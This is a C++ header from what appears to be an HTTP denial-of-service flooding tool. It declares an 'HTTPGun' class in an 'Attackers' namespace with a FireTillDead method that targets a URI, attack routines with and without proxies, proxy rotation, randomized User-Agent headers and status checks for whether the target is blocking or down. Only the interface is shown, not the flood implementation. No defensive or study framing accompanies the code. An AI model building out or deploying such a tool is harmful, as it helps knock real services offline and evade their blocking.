#ifndef HTTP_GUN_H
#define HTTP_GUN_H

#include <deque>

#include "api_interface.h"
#include "wrappers/http_wrapper.h"
#include "multithread.h"
#include "target.hpp"
#include "gun.hpp"
#include "net_utils.h"

namespace Attackers
{

class HTTPGun : public IGun
{
	enum class TargetStatus
	{
		TargetBlocking,
		TargetDown,
		TargetAlive,
		ErrorWhileRequesting
	};
public:
	HTTPGun(const TaskController &task, SPProxyGetter proxyGetter) :
		IGun(task),
		m_proxyGetter{proxyGetter}
	{}
	std::size_t FireTillDead(const URI &targetToKill) override;

private:
	TargetStatus FireGun();

	std::optional<TargetStatus> AttackWithNoProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept;
	std::optional<TargetStatus> AttackWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept;

	bool LoadProxies();

	inline void SetupNonProxyHeaders()
	{
		m_headers["User-Agent"] = NetUtil::ChoseUseragent();
		m_wrapper.SetHeaders(m_headers);
	}

	inline void SetupProxyHeaders(const std::string &proxyIP)
	{
		NetUtil::UpdateHeaders(m_headers, proxyIP);
		m_wrapper.SetHeaders(m_headers);
	}
private:
	std::deque<HTTP::Proxy> m_availableProxies;

	HTTP::Headers m_headers{HTTP::BASE_HEADERS};
	HTTP::HTTPWrapper m_wrapper;
	SPProxyGetter m_proxyGetter;
};

} // Attackers 

#endif // HTTP_GUN_H
